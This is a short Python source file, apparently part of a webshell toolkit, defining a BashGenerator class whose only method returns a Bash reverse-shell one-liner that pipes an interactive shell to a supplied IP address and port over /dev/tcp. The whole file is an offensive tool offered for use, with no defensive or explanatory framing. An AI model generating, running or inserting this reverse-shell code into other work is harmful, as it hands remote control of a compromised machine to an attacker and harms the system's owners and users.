"""Bash code generator for webshell operations."""


class BashGenerator:
    """Generate Bash code for webshell operations."""

    @staticmethod
    def reverse_shell(target_ip: str, target_port: int) -> str:
        """Generate Bash reverse shell code."""
        return f"bash -i >& /dev/tcp/{target_ip}/{target_port} 0>&1"
